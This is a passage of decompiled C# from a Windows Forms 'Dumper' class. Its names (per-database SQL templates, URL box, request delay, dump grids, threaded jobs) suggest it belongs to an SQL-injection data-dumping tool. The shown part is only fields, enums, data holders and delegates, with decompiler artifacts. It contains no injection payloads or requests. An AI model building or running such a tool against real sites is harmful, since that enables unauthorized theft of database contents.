	[CompilerGenerated]
	[DebuggerHidden]
	private void method_165(object object_0)
	{
		this.method_21((Dumper.Class47)object_0);
	}

	// Token: 0x040002BC RID: 700
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ctmTemplatesPostgreSQL")]
	private ContextMenuStrip _mnuListView_3;

	// Token: 0x040002C0 RID: 704
	[AccessedThroughProperty("ctmTemplatesOracle")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ContextMenuStrip _mnuListView_4;

	// Token: 0x040002C6 RID: 710
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("ctmTemplatesMSSQL")]
	private ContextMenuStrip _mnuListView_5;

	// Token: 0x040002CC RID: 716
	[AccessedThroughProperty("bckWorker")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private BackgroundWorker backgroundWorker_0;

	// Token: 0x040002CD RID: 717
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("tlpUrl")]
	[CompilerGenerated]
	private ToolTip toolTip_0;

	// Token: 0x040002CE RID: 718
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ctmTemplatesFilters")]
	private ContextMenuStrip _mnuListView_6;

	// Token: 0x040002D9 RID: 729
	[AccessedThroughProperty("ctmSchema")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ContextMenuStrip _mnuListView_2;

	// Token: 0x040002E4 RID: 740
	[AccessedThroughProperty("bckAlexa")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private BackgroundWorker backgroundWorker_1;

	// Token: 0x040002E5 RID: 741
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("ctmTemplatesMySQL")]
	private ContextMenuStrip _mnuListView_7;

	// Token: 0x040002F6 RID: 758
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("ctmConvert")]
	private ContextMenuStrip _mnuListView_1;

	// Token: 0x040002FD RID: 765
	[CompilerGenerated]
	[AccessedThroughProperty("imgTV")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ImageList imageList_0;

	// Token: 0x040002FE RID: 766
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("mnuTree")]
	[CompilerGenerated]
	private ContextMenuStrip _mnuListView;

	// Token: 0x0400037C RID: 892
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("imlTabs")]
	[CompilerGenerated]
	private ImageList imageList_1;

	// Token: 0x0400038A RID: 906
	private static bool bool_0;

	// Token: 0x0400038B RID: 907
	private static bool bool_1;

	// Token: 0x0400038C RID: 908
	private bool bool_2;

	// Token: 0x0400038D RID: 909
	private DumpLoading dumpLoading_0;

	// Token: 0x0400038E RID: 910
	private Dumper.Enum5 enum5_0;

	// Token: 0x0400038F RID: 911
	private Dumper.Class44 class44_0;

	// Token: 0x04000390 RID: 912
	private Dumper.Class45 class45_0;

	// Token: 0x04000391 RID: 913
	private string string_0;

	// Token: 0x04000392 RID: 914
	private bool bool_3;

	// Token: 0x04000393 RID: 915
	private global::ThreadPool threadPool_0;

	// Token: 0x04000394 RID: 916
	private Types types_0;

	// Token: 0x04000395 RID: 917
	private Dumper.Enum4 enum4_0;

	// Token: 0x04000396 RID: 918
	private List<string> list_0;

	// Token: 0x04000397 RID: 919
	private string string_1;

	// Token: 0x04000398 RID: 920
	private static char char_0;

	// Token: 0x04000399 RID: 921
	private static int int_0;

	// Token: 0x0400039A RID: 922
	private string string_2;

	// Token: 0x0400039B RID: 923
	private string string_3;

	// Token: 0x0400039C RID: 924
	private string string_4;

	// Token: 0x0400039D RID: 925
	private static char char_1;

	// Token: 0x0400039E RID: 926
	private List<DumpGrid> list_1;

	// Token: 0x0400039F RID: 927
	private DumpGrid dumpGrid_0;

	// Token: 0x040003A0 RID: 928
	private bool bool_4;

	// Token: 0x040003A1 RID: 929
	private AppDomainControl appDomainControl_0;

	// Token: 0x040003A2 RID: 930
	private string string_5;

	// Token: 0x040003A3 RID: 931
	private string string_6;

	// Token: 0x040003A4 RID: 932
	private int int_1;

	// Token: 0x040003A5 RID: 933
	private int int_2;

	// Token: 0x040003A6 RID: 934
	private bool bool_5;

	// Token: 0x040003A7 RID: 935
	internal TabControlExt tabControlExt_0;

	// Token: 0x040003A8 RID: 936
	public static int TVIF_STATE;

	// Token: 0x040003A9 RID: 937
	public static int TVIS_STATEIMAGEMASK;

	// Token: 0x040003AA RID: 938
	public static int TV_FIRST;

	// Token: 0x040003AB RID: 939
	public static int TVM_SETITEM;

	// Token: 0x040003AC RID: 940
	private static string string_7;

	// Token: 0x040003AD RID: 941
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("txtURL")]
	private ToolStripSpringTextBox toolStripSpringTextBox_0;

	// Token: 0x040003AE RID: 942
	private string string_8;

	// Token: 0x040003AF RID: 943
	private DateTime $STATIC$CheckRequestDelay$20118$LastRequestDelay;

	// Token: 0x040003B0 RID: 944
	private StaticLocalInitFlag $STATIC$CheckRequestDelay$20118$LastRequestDelay$Init;

	// Token: 0x040003B1 RID: 945
	private string $STATIC$cmbSqlType_SelectedIndexChanged$20211C12819D$sSelect;

	// Token: 0x040003B2 RID: 946
	private StaticLocalInitFlag $STATIC$cmbSqlType_SelectedIndexChanged$20211C12819D$sSelect$Init;

	// Token: 0x040003B3 RID: 947
	private string $STATIC$cmbSqlType_SelectedIndexChanged$20211C12819D$sFrom;

	// Token: 0x040003B4 RID: 948
	private StaticLocalInitFlag $STATIC$cmbSqlType_SelectedIndexChanged$20211C12819D$sFrom$Init;

	// Token: 0x040003B5 RID: 949
	private string $STATIC$cmbSqlType_SelectedIndexChanged$20211C12819D$sQuery;

	// Token: 0x040003B6 RID: 950
	private StaticLocalInitFlag $STATIC$cmbSqlType_SelectedIndexChanged$20211C12819D$sQuery$Init;

	// Token: 0x040003B7 RID: 951
	private string $STATIC$cmbSqlType_SelectedIndexChanged$20211C12819D$sQuery2;

	// Token: 0x040003B8 RID: 952
	private StaticLocalInitFlag $STATIC$cmbSqlType_SelectedIndexChanged$20211C12819D$sQuery2$Init;

	// Token: 0x040003B9 RID: 953
	private string $STATIC$cmbSqlType_SelectedIndexChanged$20211C12819D$sQuery3;

	// Token: 0x040003BA RID: 954
	private StaticLocalInitFlag $STATIC$cmbSqlType_SelectedIndexChanged$20211C12819D$sQuery3$Init;

	// Token: 0x02000073 RID: 115
	public enum enHTTPMethod
	{
		// Token: 0x040003BC RID: 956
		GET,
		// Token: 0x040003BD RID: 957
		POST
	}

	// Token: 0x02000074 RID: 116
	private enum Enum4 : byte
	{
		// Token: 0x040003BF RID: 959
		const_0,
		// Token: 0x040003C0 RID: 960
		const_1,
		// Token: 0x040003C1 RID: 961
		const_2,
		// Token: 0x040003C2 RID: 962
		const_3,
		// Token: 0x040003C3 RID: 963
		const_4,
		// Token: 0x040003C4 RID: 964
		const_5,
		// Token: 0x040003C5 RID: 965
		const_6,
		// Token: 0x040003C6 RID: 966
		const_7
	}

	// Token: 0x02000075 RID: 117
	internal enum Enum5 : byte
	{
		// Token: 0x040003C8 RID: 968
		const_0,
		// Token: 0x040003C9 RID: 969
		const_1,
		// Token: 0x040003CA RID: 970
		const_2,
		// Token: 0x040003CB RID: 971
		const_3,
		// Token: 0x040003CC RID: 972
		const_4,
		// Token: 0x040003CD RID: 973
		const_5,
		// Token: 0x040003CE RID: 974
		const_6,
		// Token: 0x040003CF RID: 975
		const_7,
		// Token: 0x040003D0 RID: 976
		const_8,
		// Token: 0x040003D1 RID: 977
		const_9
	}

	// Token: 0x02000076 RID: 118
	private sealed class Class44
	{
		// Token: 0x06000714 RID: 1812 RVA: 0x00031AA8 File Offset: 0x0002FCA8
		public Class44()
		{
			this.dictionary_0 = new Dictionary<int, string>();
			this.dictionary_1 = new Dictionary<int, string>();
			this.list_0 = new List<string>();
			this.list_1 = new List<int>();
			this.int_0 = 0;
		}

		// Token: 0x17000249 RID: 585
		// (get) Token: 0x06000715 RID: 1813 RVA: 0x00031AE4 File Offset: 0x0002FCE4
		// (set) Token: 0x06000716 RID: 1814 RVA: 0x00031AEC File Offset: 0x0002FCEC
		public int RowsAdded { get; set; }

		// Token: 0x1700024A RID: 586
		// (get) Token: 0x06000717 RID: 1815 RVA: 0x00031AF8 File Offset: 0x0002FCF8
		// (set) Token: 0x06000718 RID: 1816 RVA: 0x00031B00 File Offset: 0x0002FD00
		public int AffectedRows { get; set; }

		// Token: 0x06000719 RID: 1817 RVA: 0x00031B0C File Offset: 0x0002FD0C
		public string method_0()
		{
			return string.Format(global::Globals.translate_0.GetStr(global::Globals.GMain.DumperForm, 0, "") + " {0}, " + global::Globals.translate_0.GetStr(global::Globals.GMain.DumperForm, 1, "") + " {1}", this.dictionary_0.Count, this.dictionary_1.Count);
		}

		// Token: 0x040003D2 RID: 978
		public Dictionary<int, string> dictionary_0;

		// Token: 0x040003D3 RID: 979
		public Dictionary<int, string> dictionary_1;

		// Token: 0x040003D4 RID: 980
		public List<string> list_0;

		// Token: 0x040003D5 RID: 981
		public List<int> list_1;

		// Token: 0x040003D6 RID: 982
		public int int_0;

		// Token: 0x040003D7 RID: 983
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[CompilerGenerated]
		private int int_1;

		// Token: 0x040003D8 RID: 984
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[CompilerGenerated]
		private int int_2;
	}

	// Token: 0x02000077 RID: 119
	// (Invoke) Token: 0x0600071D RID: 1821
	private delegate void Delegate20(string sString);

	// Token: 0x02000078 RID: 120
	// (Invoke) Token: 0x06000721 RID: 1825
	private delegate void Delegate21(string sString, string sString2);

	// Token: 0x02000079 RID: 121
	// (Invoke) Token: 0x06000725 RID: 1829
	private delegate void Delegate22(string sString, string sString2, string sString3);

	// Token: 0x0200007A RID: 122
	// (Invoke) Token: 0x06000729 RID: 1833
	private delegate void Delegate23(string sString, string sString2, string sString3, string sString4);

	// Token: 0x0200007B RID: 123
	// (Invoke) Token: 0x0600072D RID: 1837
	private delegate void Delegate24(string sColunm, string sValue, int intIndex);

	// Token: 0x0200007C RID: 124
	// (Invoke) Token: 0x06000731 RID: 1841
	private delegate void Delegate25(string sVersion, string sCountry, Image picFLag);

	// Token: 0x0200007D RID: 125
	// (Invoke) Token: 0x06000735 RID: 1845
	private delegate int Delegate26(Schema oT, string sDB, string sTable, string sCollumn, string sCount1, string sCount2);

	// Token: 0x0200007E RID: 126
	// (Invoke) Token: 0x06000739 RID: 1849
	private delegate int Delegate27(Schema oT, string sDB, string sTable, string sCollumn);

	// Token: 0x0200007F RID: 127
	private sealed class Class45
	{
		// Token: 0x0600073A RID: 1850 RVA: 0x00031B84 File Offset: 0x0002FD84
		public Class45()
		{
			this.dictionary_0 = new Dictionary<string, Dumper.Class45.Class46>();
		}

		// Token: 0x0600073B RID: 1851 RVA: 0x00031B98 File Offset: 0x0002FD98
		public Dumper.Class45.Class46 method_0(int int_0)
		{
			checked
			{
				try
				{
					foreach (KeyValuePair<string, Dumper.Class45.Class46> keyValuePair in this.dictionary_0)
					{
						int num;
						if (num.Equals(int_0))
						{
							return this.dictionary_0[keyValuePair.Key];
						}
						num++;
					}
				}
				finally
				{
					Dictionary<string, Dumper.Class45.Class46>.Enumerator enumerator;
					((IDisposable)enumerator).Dispose();
				}
				return null;
			}
		}

		// Token: 0x0600073C RID: 1852 RVA: 0x00031C0C File Offset: 0x0002FE0C
		public int method_1()
		{
			return this.dictionary_0.Count;
		}

		// Token: 0x0600073D RID: 1853 RVA: 0x00031C28 File Offset: 0x0002FE28
		public void method_2(string string_0)
		{
			Dumper.Class45.Class46 @class = new Dumper.Class45.Class46();
			@class.DataBase = string_0;
			this.dictionary_0.Add(string_0, @class);
		}

		// Token: 0x0600073E RID: 1854 RVA: 0x00031C50 File Offset: 0x0002FE50
		public void method_3(string string_0, string string_1)
		{
			Dumper.Class45.Class46 @class = this.dictionary_0[string_0];
			@class.Table = string_1;
		}

		// Token: 0x0600073F RID: 1855 RVA: 0x00031C74 File Offset: 0x0002FE74
		public void method_4(string string_0, string string_1, string string_2)
		{
			Dumper.Class45.Class46 @class = this.dictionary_0[string_0];
			if (!@class.Columns.Contains(string_2))
			{
				@class.Columns.Add(string_2);
			}
		}

		// Token: 0x06000740 RID: 1856 RVA: 0x00031CAC File Offset: 0x0002FEAC
		public void method_5(string string_0, string string_1, string string_2)
		{
			Dumper.Class45.Class46 @class = this.dictionary_0[string_0];
			@class.Query = string_2;
		}

		// Token: 0x040003D9 RID: 985
		public Dictionary<string, Dumper.Class45.Class46> dictionary_0;

		// Token: 0x02000080 RID: 128
		public sealed class Class46
		{
			// Token: 0x06000741 RID: 1857 RVA: 0x00031CD0 File Offset: 0x0002FED0
			public Class46()
			{
				this.DataBase = "";
				this.Table = "";
				this.Query = "";
				this.Columns = new List<string>();
			}

			// Token: 0x1700024B RID: 587
			// (get) Token: 0x06000742 RID: 1858 RVA: 0x00031D04 File Offset: 0x0002FF04
			// (set) Token: 0x06000743 RID: 1859 RVA: 0x00031D0C File Offset: 0x0002FF0C
			public string DataBase { get; set; }

			// Token: 0x1700024C RID: 588
			// (get) Token: 0x06000744 RID: 1860 RVA: 0x00031D18 File Offset: 0x0002FF18
			// (set) Token: 0x06000745 RID: 1861 RVA: 0x00031D20 File Offset: 0x0002FF20
			public string Table { get; set; }

			// Token: 0x1700024D RID: 589
			// (get) Token: 0x06000746 RID: 1862 RVA: 0x00031D2C File Offset: 0x0002FF2C
			// (set) Token: 0x06000747 RID: 1863 RVA: 0x00031D34 File Offset: 0x0002FF34
			public List<string> Columns { get; set; }

			// Token: 0x1700024E RID: 590
			// (get) Token: 0x06000748 RID: 1864 RVA: 0x00031D40 File Offset: 0x0002FF40
			// (set) Token: 0x06000749 RID: 1865 RVA: 0x00031D48 File Offset: 0x0002FF48
			public string Query { get; set; }

			// Token: 0x040003DA RID: 986
			[CompilerGenerated]
			[DebuggerBrowsable(DebuggerBrowsableState.Never)]
			private string string_0;

			// Token: 0x040003DB RID: 987
			[DebuggerBrowsable(DebuggerBrowsableState.Never)]
			[CompilerGenerated]
			private string string_1;

			// Token: 0x040003DC RID: 988
			[CompilerGenerated]
			[DebuggerBrowsable(DebuggerBrowsableState.Never)]
			private List<string> list_0;

			// Token: 0x040003DD RID: 989
			[DebuggerBrowsable(DebuggerBrowsableState.Never)]
			[CompilerGenerated]
			private string string_2;
		}
	}

	// Token: 0x02000081 RID: 129
	private sealed class Class47
	{
		// Token: 0x0600074A RID: 1866 RVA: 0x00031D54 File Offset: 0x0002FF54
		public Class47(Thread thread_1, int int_6, int int_7)
		{
			this.int_0 = -1;
			this.int_1 = 0;
			this.thread_0 = thread_1;
			this.int_0 = int_6;
			this.int_1 = int_7;
			this.IndexJob = -1;
		}

		// Token: 0x1700024F RID: 591
		// (get) Token: 0x0600074B RID: 1867 RVA: 0x00031D88 File Offset: 0x0002FF88
		// (set) Token: 0x0600074C RID: 1868 RVA: 0x00031D90 File Offset: 0x0002FF90
		public int TotalThreads { get; set; }

		// Token: 0x17000250 RID: 592
		// (get) Token: 0x0600074D RID: 1869 RVA: 0x00031D9C File Offset: 0x0002FF9C
		// (set) Token: 0x0600074E RID: 1870 RVA: 0x00031DA4 File Offset: 0x0002FFA4
		public int TotalJob { get; set; }

		// Token: 0x17000251 RID: 593
		// (get) Token: 0x0600074F RID: 1871 RVA: 0x00031DB0 File Offset: 0x0002FFB0
		// (set) Token: 0x06000750 RID: 1872 RVA: 0x00031DB8 File Offset: 0x0002FFB8
		public int IndexJob { get; set; }

		// Token: 0x17000252 RID: 594
		// (get) Token: 0x06000751 RID: 1873 RVA: 0x00031DC4 File Offset: 0x0002FFC4
		// (set) Token: 0x06000752 RID: 1874 RVA: 0x00031DCC File Offset: 0x0002FFCC
		public int AfectedRows { get; set; }

		// Token: 0x17000253 RID: 595
		// (get) Token: 0x06000753 RID: 1875 RVA: 0x00031DD8 File Offset: 0x0002FFD8
		// (set) Token: 0x06000754 RID: 1876 RVA: 0x00031DE0 File Offset: 0x0002FFE0
		public string DataBase { get; set; }

		// Token: 0x17000254 RID: 596
		// (get) Token: 0x06000755 RID: 1877 RVA: 0x00031DEC File Offset: 0x0002FFEC
		// (set) Token: 0x06000756 RID: 1878 RVA: 0x00031DF4 File Offset: 0x0002FFF4
		public string Table { get; set; }

		// Token: 0x17000255 RID: 597
		// (get) Token: 0x06000757 RID: 1879 RVA: 0x00031E00 File Offset: 0x00030000
		// (set) Token: 0x06000758 RID: 1880 RVA: 0x00031E08 File Offset: 0x00030008
		public List<string> Columns { get; set; }

		// Token: 0x17000256 RID: 598
		// (get) Token: 0x06000759 RID: 1881 RVA: 0x00031E14 File Offset: 0x00030014
		// (set) Token: 0x0600075A RID: 1882 RVA: 0x00031E1C File Offset: 0x0003001C
		public string Err { get; set; }

		// Token: 0x17000257 RID: 599
		// (get) Token: 0x0600075B RID: 1883 RVA: 0x00031E28 File Offset: 0x00030028
		public Thread Thread_0
		{
			get
			{
				return this.thread_0;
			}
		}

		// Token: 0x17000258 RID: 600
		// (get) Token: 0x0600075C RID: 1884 RVA: 0x00031E40 File Offset: 0x00030040
		public int Int32_0
		{
			get
			{
				return this.int_0;
			}
		}

		// Token: 0x17000259 RID: 601
		// (get) Token: 0x0600075D RID: 1885 RVA: 0x00031E58 File Offset: 0x00030058
		public int Int32_1
		{
			get
			{
				return this.int_1;
			}
		}

		// Token: 0x040003DE RID: 990
		private Thread thread_0;

		// Token: 0x040003DF RID: 991
		private int int_0;

		// Token: 0x040003E0 RID: 992
		private int int_1;

		// Token: 0x040003E1 RID: 993
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[CompilerGenerated]
		private int int_2;

		// Token: 0x040003E2 RID: 994
		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		private int int_3;

		// Token: 0x040003E3 RID: 995
		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		private int int_4;

		// Token: 0x040003E4 RID: 996
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[CompilerGenerated]
		private int int_5;

		// Token: 0x040003E5 RID: 997
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[CompilerGenerated]
		private string string_0;

		// Token: 0x040003E6 RID: 998
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[CompilerGenerated]
		private string string_1;

		// Token: 0x040003E7 RID: 999
		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		private List<string> list_0;

		// Token: 0x040003E8 RID: 1000
		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		private string string_2;
	}

	// Token: 0x02000082 RID: 130
	// (Invoke) Token: 0x06000761 RID: 1889
	private delegate void Delegate28(int iTColumns);

	// Token: 0x02000083 RID: 131
	// (Invoke) Token: 0x06000765 RID: 1893
	private delegate void Delegate29(List<string> lRow);

	// Token: 0x02000084 RID: 132
	// (Invoke) Token: 0x06000769 RID: 1897
	private delegate void Delegate30(int index, string value);

	// Token: 0x02000085 RID: 133
	public struct TVITEM
	{
		// Token: 0x040003E9 RID: 1001
		public int mask;

		// Token: 0x040003EA RID: 1002
		public IntPtr hItem;

		// Token: 0x040003EB RID: 1003
		public int state;

		// Token: 0x040003EC RID: 1004
		public int stateMask;

		// Token: 0x040003ED RID: 1005
		[MarshalAs(UnmanagedType.LPTStr)]
		public string lpszText;

		// Token: 0x040003EE RID: 1006
		public int cchTextMax;

		// Token: 0x040003EF RID: 1007
		public int iImage;

		// Token: 0x040003F0 RID: 1008
		public int iSelectedImage;

		// Token: 0x040003F1 RID: 1009
		public int cChildren;

		// Token: 0x040003F2 RID: 1010
		public IntPtr lParam;
	}

	// Token: 0x02000086 RID: 134
	public class TreeNodeComparer : IComparer<TreeNode>
	{
		// Token: 0x0600076B RID: 1899 RVA: 0x00031E78 File Offset: 0x00030078
		public int Compare(TreeNode x, TreeNode y)
		{
			int num;
			if (x == null)
			{
				if (y == null)
				{
					num = 0;
				}
				else
				{
					num = -1;
				}
			}
			else if (y == null)
			{
				num = 1;
			}
			else
			{
				num = string.CompareOrdinal(x.Text, y.Text);
			}
			return num;
		}
	}
}
